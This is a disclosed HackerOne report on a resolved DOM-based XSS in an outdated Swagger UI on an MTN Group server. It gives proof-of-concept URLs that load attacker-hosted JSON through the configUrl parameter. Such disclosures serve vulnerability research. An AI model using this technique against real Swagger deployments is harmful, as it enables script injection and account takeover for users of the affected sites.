---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-dom
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - DOM"
enriched: true
body: true
date: 2024-12-25
submitted: 2024-01-16T08:09:58.518Z
bounty_usd: null
votes: 104
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "nhx1"
source: "https://hackerone.com/reports/2321874"
title: "DOM Based Reflected Cross Site Scripting"
---
# DOM Based Reflected Cross Site Scripting

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 104 | **Program:** MTN Group | **Disclosed:** 2024-12-25

- Report: [https://hackerone.com/reports/2321874](https://hackerone.com/reports/2321874)
- CWE: Cross-site Scripting (XSS) - DOM
- Submitted: 2024-01-16T08:09:58.518Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
I hope you're doing well. I stumbled upon one of your assets. Upon further inspection I realized that the asset was running an outdated version of Swagger. 
The outdated version of Swagger is well-known for Cross-Site Scripting vulnerabilities so I went ahead and attempted to test it in  https://notification-server-v2.sz-my.mtn.com/.  Turns out, it's vulnerable to Cross-Site Scripting. To reproduce it, please follow the steps of reproduction. I have not assessed the full impact of this vulnerability but it is highly probable that a malicious actor could exploit to takeover accounts of applications hosted under *.mtn.com. I hope this gets patched soon. If there's some additional information that you need from my side, please let me know. Thank you. 

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Go to the following URL https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
  1. Observe the alert pop up like in the screenshot below
  

{F2983813}

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A malicious actor could execute arbitrary scripts

## Timeline

- **Report Filed**
- **2024-01-16** @nhx1: Looks like https://jumpy-floor.surge.sh/test.json is down right now. You could use https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://xss.smarpo.com/test.json the following URL to reproduce XSS.
- **Report Triaged**
- **2024-09-04** @slydingdong1: Hi @nhx1 

Can you please test again.

Regards
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
